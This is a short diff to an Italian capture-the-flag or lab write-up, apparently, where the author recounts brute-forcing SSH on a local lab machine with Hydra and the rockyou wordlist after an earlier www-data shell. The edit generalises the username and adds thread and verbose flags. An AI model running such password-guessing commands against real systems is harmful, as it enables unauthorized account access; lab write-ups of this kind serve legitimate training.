@@ -60,7 +60,7 @@ La shell **www-data** sembrava una strada chiusa. (Ma più tardi eheh ci arriver
 Prima di arrendermi in realtà con tutto quanto dalla frustrazione, ho deciso di provare un attacco **Hydra** sul servizio SSH usando la lista di utenti recuperati con poche speranze, finché mi imbatto in anne.
 
 ```bash
-hydra -l anne -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.170
+hydra -l <username> -P /usr/share/wordlists/rockyou.txt -t 64 -V ssh://192.168.1.170
 ```
 
 **EUREKA**:
